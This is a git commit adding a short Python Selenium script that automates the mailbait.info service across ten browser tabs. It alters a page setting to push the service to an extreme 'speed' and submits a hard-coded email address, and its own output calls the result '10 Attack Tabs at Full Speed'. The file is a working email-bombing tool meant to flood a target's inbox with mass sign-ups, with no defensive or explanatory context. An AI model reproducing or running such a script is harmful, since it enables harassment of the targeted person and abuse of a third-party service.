a3abeb8672c3a7788769b16a252d02674eb51210
warloxactual <47298985+warloxactual@users.noreply.github.com>
2021-08-04 09:49:15 -0700

    Add files via upload

---
+++ dotspell.py
@@ -0,0 +1,38 @@
+from selenium import webdriver
+import time
+from random import randint
+
+email = 'toastaccount@protonmail.com'
+driver = webdriver.Chrome() 
+url = "https://mailbait.info/run.html"
+
+
+for i in range(10):
+    driver.switch_to.window(driver.window_handles[-1])
+    driver.get(url)
+    driver.execute_script('document.querySelector("#speed > option").value = -11000')
+
+    text_box = driver.find_element_by_id('.mbe')
+
+    text_box.send_keys(email)
+
+    categories_check = driver.find_element_by_id('categories1')
+
+    run = driver.find_element_by_id('runt')
+    run.click()
+
+    categories_check.click()
+    print(f'The current tab is: {i + 1}')
+    
+    print('Sleeping for 300 seconds...')
+    time.sleep(300)
+    
+
+    driver.execute_script("window.open('https://mailbait.info/run.html');")
+
+
+driver.close()
+
+print(10*"-")
+print('Browser Window of 10 Attack Tabs at Full Speed = Complete')
+print(10*"-")
